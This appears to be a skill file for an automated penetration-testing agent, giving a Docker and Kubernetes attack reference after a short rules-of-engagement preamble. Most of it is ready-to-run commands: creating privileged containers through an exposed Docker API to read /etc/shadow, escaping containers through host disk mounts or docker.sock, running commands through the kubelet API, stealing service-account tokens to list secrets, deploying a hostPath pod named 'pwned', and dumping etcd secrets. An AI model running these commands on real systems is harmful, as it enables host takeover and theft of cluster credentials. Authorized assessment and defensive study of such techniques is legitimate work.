---
name: svc-docker-k8s
description: "Docker/Kubernetes attacks: exposed API, container escape, RBAC, privileged pod, secret theft. Triggers - Docker 2375, K8s 6443, kubelet, docker.sock."
---

## Rules of Engagement
Only test systems you are authorized to assess. Confirm the written scope and rate limits before active commands. Prefer the least-invasive check that proves impact; stop on evidence of production impact.

# Docker & Kubernetes Attack Reference

## Docker API (2375/2376)
```bash
# Check for exposed Docker daemon
curl http://<target>:2375/version
curl http://<target>:2375/containers/json

# RCE via container creation
curl -X POST http://<target>:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /etc/shadow"],"Binds":["/:/mnt"],"Privileged":true}'

# Then start and read logs
curl -X POST http://<target>:2375/containers/<id>/start
curl http://<target>:2375/containers/<id>/logs?stdout=true
# Remove the container after proof: DELETE http://<target>:2375/containers/<id>?force=true
```

## Container Escape
```bash
# Check if inside container
cat /proc/1/cgroup | grep -i docker
ls -la /.dockerenv

# Privileged container escape
fdisk -l                           # can see host disks?
mount /dev/sda1 /mnt && chroot /mnt

# Docker socket mounted
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt

# CVE-2019-5736 (runc <1.0-rc6): overwrite runc binary from container
```

## Kubernetes API (6443/8443)
```bash
# Unauthenticated access
curl -k https://<target>:6443/api
curl -k https://<target>:6443/api/v1/namespaces
curl -k https://<target>:6443/api/v1/pods
curl -k https://<target>:8443/version

# With token (from pod service account)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets

# kubelet API (10250): /pods is anonymous-open only if --anonymous-auth=true (disabled by default since K8s 1.19)
curl -k https://<target>:10250/pods
curl -k https://<target>:10250/run/<namespace>/<pod>/<container> -d "cmd=id"
```

## K8s RBAC Abuse
```bash
# Check permissions
kubectl auth can-i --list
kubectl auth can-i create pods

# Pod with host mount (if create pods allowed)
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: pwned
spec:
  containers:
  - name: pwned
    image: alpine
    command: ["/bin/sh","-c","cat /host/etc/shadow"]
    volumeMounts:
    - mountPath: /host
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
EOF
```

## etcd (2379)
```bash
# Unauthenticated etcd (client-cert auth is enforced by default; only if disabled) — contains all K8s secrets
etcdctl --endpoints=http://<target>:2379 get / --prefix --keys-only
etcdctl --endpoints=http://<target>:2379 get /registry/secrets --prefix
```
